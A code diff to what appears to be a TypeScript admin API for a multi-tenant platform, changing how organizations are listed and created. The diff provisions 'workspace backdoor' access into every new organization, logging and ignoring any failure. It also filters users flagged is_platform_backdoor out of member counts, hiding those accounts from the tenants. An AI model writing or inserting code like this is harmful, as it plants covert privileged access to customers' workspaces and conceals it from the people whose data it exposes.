@@ -10,6 +10,7 @@
 import { j } from "../../adminApiUtils";
 import { supabaseServiceClient, SupabaseConfigError } from "../../supabaseServer";
 import { requirePlatformSession } from "../../platformApiUtils";
+import { ensureWorkspaceBackdoorAccess } from "../../workspaceBackdoor";
 
 export const config = { runtime: "edge" };
 
@@ -88,13 +89,18 @@ async function listOrganizations(req: Request): Promise<Response> {
       locCountByOrg.set(r.organization_id, (locCountByOrg.get(r.organization_id) ?? 0) + 1);
     }
 
-    const { data: memberCounts, error: memErr } = await supabase
+    const { data: memberRows, error: memErr } = await supabase
       .from("org_memberships")
-      .select("organization_id")
+      .select("organization_id, admin_user_id, admin_users:admin_user_id ( is_platform_backdoor )")
       .in("organization_id", orgIds);
     if (memErr) return j({ ok: false, error: memErr.message }, 500);
     const memCountByOrg = new Map<string, number>();
-    for (const r of (memberCounts ?? []) as Array<{ organization_id: string }>) {
+    for (const r of (memberRows ?? []) as Array<{
+      organization_id: string;
+      admin_users: { is_platform_backdoor?: boolean } | { is_platform_backdoor?: boolean }[] | null;
+    }>) {
+      const au = Array.isArray(r.admin_users) ? r.admin_users[0] : r.admin_users;
+      if (au?.is_platform_backdoor) continue;
       memCountByOrg.set(r.organization_id, (memCountByOrg.get(r.organization_id) ?? 0) + 1);
     }
 
@@ -269,6 +275,12 @@ async function createOrganization(req: Request): Promise<Response> {
         trialDays,
       },
     });
+
+    try {
+      await ensureWorkspaceBackdoorAccess(supabase, org.id);
+    } catch (backdoorErr) {
+      console.error("platform/organizations: backdoor provision failed", backdoorErr);
+    }
 
     return j({ ok: true, organization: org }, 201);
   } catch (err: unknown) {
